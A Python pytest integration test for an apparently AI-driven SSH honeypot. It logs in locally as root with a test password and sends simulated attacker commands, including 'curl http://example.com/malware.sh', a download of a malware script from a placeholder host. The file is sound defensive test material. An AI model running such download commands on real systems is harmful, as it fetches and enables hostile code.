import pytest
import asyncssh
import asyncio
import os
import requests

# Ensure we test against live dev environment (assuming localhost running)
TARGET_HOST = os.getenv("TEST_TARGET_HOST", "127.0.0.1")
TARGET_PORT = int(os.getenv("TEST_TARGET_PORT", 2222))

@pytest.mark.asyncio
async def test_ssh_to_ai_integration():
    """ Integration test verifying SSH connection triggers AI (or static fallback) returning valid terminal strings.
    WARNING: Requires docker-compose services up and running. """
    
    # Check if sandbox is reachable as proxy for system running
    try:
        requests.get("http://localhost:8001/health", timeout=3)
    except:
        pytest.skip("System is not running locally. Skipping integration test.")
        
    try:
        conn = await asyncio.wait_for(asyncssh.connect(
            TARGET_HOST, 
            port=TARGET_PORT, 
            username="root", 
            password="root123",
            known_hosts=None
        ), timeout=10.0)
        
        # Test a static command
        result = await conn.run("whoami", check=False)
        assert "root" in result.stdout
        
        # Test an AI/fallback command
        result = await conn.run("curl http://example.com/malware.sh", check=False)
        assert "403 Forbidden" in result.stdout or "Failed to connect" in result.stdout or "connected" in result.stdout
        
        conn.close()
    except Exception as e:
        pytest.fail(f"Integration failed: {e}")
